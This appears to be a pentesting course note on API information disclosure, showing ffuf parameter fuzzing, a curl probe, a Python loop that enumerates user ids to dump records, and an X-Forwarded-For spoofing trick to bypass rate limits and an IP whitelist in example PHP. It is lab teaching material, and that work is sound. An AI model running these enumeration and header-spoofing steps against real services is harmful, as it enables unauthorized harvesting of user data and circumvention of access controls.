When assessing a web service or API for information disclosure, we should spend considerable time on fuzzing

## Information Disclosure through Fuzzing
* Suppose we are assessing an API residing in `http://<TARGET IP>:3003`
* Let us perform parameter fuzzing using _ffuf_ 

```sh
$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19

 
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>:3003/?FUZZ=test_value
 :: Wordlist         : FUZZ: /home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 19
________________________________________________

:: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 id                      [Status: 200, Size: 38, 
```

* _id_ is a valid parameter
* Check the response when specifying _id_ as a parameter and a test value

```sh
$ curl http://<TARGET IP>:3003/?id=1
[{"id":"1","username":"admin","position":"1"}]
```

* Automate retrieving all information that the API returns

```python
import requests, sys

def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/?id='+str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://<TARGET IP>:3003/")

brute()
```

```sh
$ python3 brute_api.py http://<TARGET IP>:3003
Number found! 1
[{"id":"1","username":"admin","position":"1"}]
Number found! 2
[{"id":"2","username":"HTB-User-John","position":"2"}]
...
```

**TIP**: If there is a rate limit in place, you can always try to bypass it through headers such as X-Forwarded-For, X-Forwarded-IP, etc., or use proxies. These headers have to be compared with an IP most of the time. See an example below.

```php
<?php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
{
    header("HTTP/1.1 401 Unauthorized");
}
else
{
  print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
}
```

The issue here is that the code compares the _HTTP_X_FORWARDED_FOR_ header to the possible _whitelist_ values, and if the _HTTP_X_FORWARDED_FOR_ is not set or is set without one of the IPs from the array, it'll give a 401. A possible bypass could be setting the _X-Forwarded-For_ header and the value to one of the IPs from the array.

